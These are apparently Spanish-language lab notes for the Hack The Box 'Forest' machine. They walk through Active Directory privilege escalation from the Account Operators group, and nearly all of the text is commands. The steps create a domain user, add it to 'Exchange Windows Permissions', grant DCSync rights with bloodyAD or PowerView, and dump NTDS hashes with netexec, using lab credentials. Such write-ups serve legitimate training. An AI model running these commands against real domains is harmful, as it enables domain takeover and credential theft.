Escalada de Privilegios

Grupo Account Operators

whoami /groups
# Crear nuevos usuarios
# Agregar usuarios a grupos como Exchange Windows Permissions

Opción 1: Nuevo Usuario

# Windows: Sesión de svc-alfresco
# Crear usuario alvaro:alvaro123 y añadirlo al dominio
net user alvaro alvaro123 /add /domain
# Añadirlo al grupo "Exchange Windows Permissions"
net group "Exchange Windows Permissions" alvaro /add

# Kali
# Agregar Permisos DCSync desde alvaro a él mismo
bloodyAD --host forest.htb.local --dc-ip forest -d htb.local -u alvaro -p alvaro123 add dcsync alvaro
# Dumpear Hashes NTLM
netexec smb forest -u 'alvaro' -p 'alvaro123' --ntds

# El grupo Exchange Windows Permissions permite al usuario otorgar los permisos DCSync necesarios para dumpear NTDS a cualquier usuario del dominio, incluido el mismo

Opción 2: Usuario actual

# Windows: Sesión de svc-alfresco
# Añadirlo al grupo "Exchange Windows Permissions"
net group "Exchange Windows Permissions" svc-alfresco /add
# Agregar Permisos DCSync a svc-alfresco
net group "Exchange Windows Permissions" svc-alfresco /add
Add-DomainObjectAcl  -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync

# Kali
netexec smb forest -u 'svc-alfresco' -p 's3rvice' --ntds

# Los permisos DCSync se pueden otorgar desde Kali o Windows como hemos podido ver. Desde Windows si no se especifica (-Credential $Cred) ,escogerá al usuario de la sesión actual como usuario que presuntamente tiene permisos de otorgar DCSync. En caso de especificar otro usuario con esta capacidad debemos de agregarlo de la siguiente manera

$SecPass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPass)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
